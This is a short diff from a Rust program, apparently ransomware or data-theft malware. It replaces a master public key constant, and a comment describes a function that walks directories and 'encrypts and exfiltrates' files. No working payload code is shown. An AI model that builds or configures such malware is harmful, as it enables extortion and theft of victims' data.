@@ -46,7 +46,7 @@ const EXCLUDED_FILES: &'static [&'static str] = &[
     ".swo",
 ];
 
-const MASTER_PUBLIC_KEY_B64: &str = "CDwCVxtIpZuAKzESg+9DZ7JmhSpN8iRN1iCpmHU4W0U";
+const MASTER_PUBLIC_KEY_B64: &str = "ymUeDo3ToZmXII9lTA+Itgm/SWSKEiAHTvEtj25TKhY";
 
 /// Walks a directory tree starting from `path`, excluding directories
 /// and files based on predefined lists, and encrypts and exfiltrates
